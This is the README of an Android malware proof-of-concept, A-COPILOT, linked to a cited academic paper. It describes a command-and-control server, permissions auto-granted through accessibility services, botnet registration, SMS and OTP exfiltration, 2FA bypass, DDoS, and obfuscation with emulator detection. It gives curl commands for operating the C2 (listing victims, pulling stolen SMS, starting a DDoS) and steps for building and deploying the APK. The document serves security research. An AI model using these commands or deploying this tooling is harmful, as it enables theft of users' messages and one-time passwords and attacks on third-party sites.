
# A-COPILOT: Android Covert Operation for Private Information Lifting and OTP Theft


## Abstract

A-COPILOT is an Android application designed to explore covert operations for lifting private information and stealing One-Time Passwords (OTPs). This proof-of-concept (PoC) app demonstrates how malware can masquerade as legitimate applications to compromise security and privacy. The app leverages accessibility features and runtime permissions to conduct unauthorized activities stealthily.
## Security Features

### 1. Command and Control (C2)
- **Description:** The C2 component enables centralized control of compromised devices, allowing remote execution of commands and monitoring.
- **Setup:** The C2 server is set up using Python and Flask. Devices automatically connect and register with the C2 server upon app launch.

### 2. Auto-Granting Runtime Permissions via Accessibility Service
- **Description:** A-COPILOT exploits accessibility services to automatically grant itself necessary permissions without user interaction, facilitating covert operations.
- **Setup:** Run the app and enable accessibility services to initiate auto-granting of permissions.

### 3. Botnet Registration
- **Description:** Devices running A-COPILOT register with a central C2 server, allowing for remote control and monitoring.
- **Setup:** The registration occurs automatically upon app launch, creating a unique UUID for each device.

### 4. WebSocket Connection Establishment
- **Description:** Establishes a secure WebSocket connection for real-time communication between the app and the C2 server.
- **Command:** WebSocket connections are established automatically. Use `curl.exe -X POST "http://<server_ip>:8000/list_devices" -H "Content-Type: text/plain" -d '!@#$QWER'` to list connected devices.

### 5. SMS Exfiltration
- **Description:** A-COPILOT reads and exfiltrates SMS messages from the device to the C2 server.
- **Command:** Initiate SMS exfiltration with `curl.exe -X POST "http://<server_ip>:8000/list_received_sms" -H "Content-Type: application/json" -d '{"password": "!@#$QWER"}'`.

### 6. Distributed Denial of Service (DDoS)
- **Description:** The app can launch DDoS attacks on specified targets by sending numerous HTTP requests.
- **Command:** Start a DDoS attack using `curl.exe -X POST "http://<server_ip>:8000/trigger_ddos" -H "Content-Type: application/json" -d '{"url": "http://example.com", "password": "!@#$QWER"}'`

### 7. Hash Cracking
- **Description:** A-COPILOT includes functionality to crack hashed passwords using an embedded wordlist.
- **Command:** Perform hash cracking with `curl.exe -X POST "http://<server_ip>:8000/submit_salt_and_hash" -H "Content-Type: application/json" -d '{"salt": "65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5", "salted_hash": "37aa4c4d546adb02615b6e867cd5afe399437edc300dff07fc8f0a94a502ed51", "password": "!@#$QWER"}'`

### 8. Account Compromise POC
- **Description:** Demonstrates a Proof-of-Concept for compromising user accounts by keylogging credentials and bypassing 2FA.
- **Command:** Use the sequence of commands to simulate the attack:
    - **Query device state:** `curl.exe -X POST "http://<server_ip>:8000/query_power" -H "Content-Type: text/plain" -d '!@#$QWER'`
    - **Toggle DND:** `curl.exe -X POST "http://<server_ip>:8000/send_event_unicast" -H "Content-Type: application/json" -d '{"password": "!@#$QWER", "event": "dndOn", "uuid": "<device_uuid>"}'`
    - **Steal OTP:** Upon receiving the OTP via SMS, it will be exfiltrated automatically.

### 9. Obfuscation & Detection
- **Description:** A-COPILOT employs various obfuscation techniques to hinder reverse engineering and enhance security.
- **Techniques:** Includes string obfuscation, control flow obfuscation, and detection mechanisms for emulators and rooted devices.
## Installation and Setup
### Prerequisites
- Android Studio
- Python (for running the C2 server)
- Network configuration to allow traffic on the relevant ports

### Steps to Install
#### 1. Clone the Repository:
- `git clone https://github.com/samuelsongg/A-COPILOT.git`

#### 2. Open in Android Studio:
- Import the project and Sync with Gradle.

#### 3. Ensure all API keys have been replaced in:
- `app/src/main/java/com/mobilesec/govcomm/mal/Aes.kt`
- `app/src/main/java/com/mobilesec/govcomm/mal/SecurityUtils.kt`
- `app/src/main/java/com/mobilesec/govcomm/mal/GovcommAccessibilityService.kt`
- `app/src/main/java/com/mobilesec/govcomm/ui/screens/teamchat/TeamChatScreen.kt`
- `app/google-services.json`
- `c2_server/c2_server.py`

#### 4. Build the APK:
- Use the release variant to apply Proguard obsfucation.

#### 5. Deploy the APK:
- Install on the test devices.

### Setting Up the C2 server
If running locally on the machine, ensure that the IP address in the source code has been changed to the IP address of the machine running the C2 server, and instead of configuring Network Security Group to allow for Port TCP/8000, apply the necessary firewall configurations to your local machine.

#### 1. Install Dependencies:
- `pip install -r requirements.txt`

#### 2. Run the Server:
- `python3 c2_server.py`
## DOI and Citation

For an in-depth exploration of A-COPILOT's security features and its implications, refer to:

- Citation: Joseph Guan Quan Lim, Zhen Yu Kwok, Isaac Soon, Jun Xian Yong, Samuel Song Yuhao, Siti Halilah Binte Rosley, and Vivek Balachandran. 2024. "A-COPILOT: Android Covert Operation for Private Information Lifting and OTP Theft." ACM Conference on Data and Application Security and Privacy (CODASPY’24), Porto, Portugal. DOI: [10.1145/3626232.3658638](https://doi.org/10.1145/3626232.3658638)
## Disclaimer
A-COPILOT is developed strictly for educational purposes to demonstrate potential security vulnerabilities in Android applications. This application should not be used for any malicious or illegal activities. The authors and contributors of A-COPILOT do not take any responsibility for any misuse of the application or its features. By using this application, you agree to take full responsibility for your actions and to comply with all applicable laws and regulations.